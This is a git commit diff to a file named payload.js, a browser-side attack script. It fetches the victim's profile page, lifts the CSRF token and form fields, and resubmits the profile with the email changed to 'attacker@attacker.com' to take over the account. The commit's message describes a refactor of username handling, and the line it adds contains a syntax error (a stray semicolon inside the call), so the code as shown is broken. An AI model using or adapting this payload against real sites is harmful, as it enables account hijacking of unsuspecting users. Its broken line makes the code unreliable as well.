0531133fe9ca47f5027933ccb3a6b142eec28126
Cyb3rFred <75452166+cyb3r7hr347@users.noreply.github.com>
2026-02-21 15:46:39 +0100

    Refactor username parameter extraction
    Removed hardcoded username and updated username parameter handling.

--- payload.js
+++ payload.js
@@ -5,17 +5,13 @@ fetch('/profile')
     const doc = parser.parseFromString(html, 'text/html');
 
     const csrfToken = doc.querySelector('input[name="csrf_token"]').value;
-    const username = 'aaa' + doc.querySelector('input[name="username"]').value;
     
     const params = new URLSearchParams();
     params.append('csrf_token', csrfToken);
-    params.append('username', username);
+    params.append('username', doc.querySelector('input[name="username"]').value;);
     params.append('firstname', doc.querySelector('input[name="firstname"]').value);
     params.append('lastname', doc.querySelector('input[name="lastname"]').value);
     params.append('email', 'attacker@attacker.com');
-    params.append('oldpassword', '');
-    params.append('password', '');
-    params.append('passwordCheck' , '');
     params.append('submit', 'Submit');
     
 
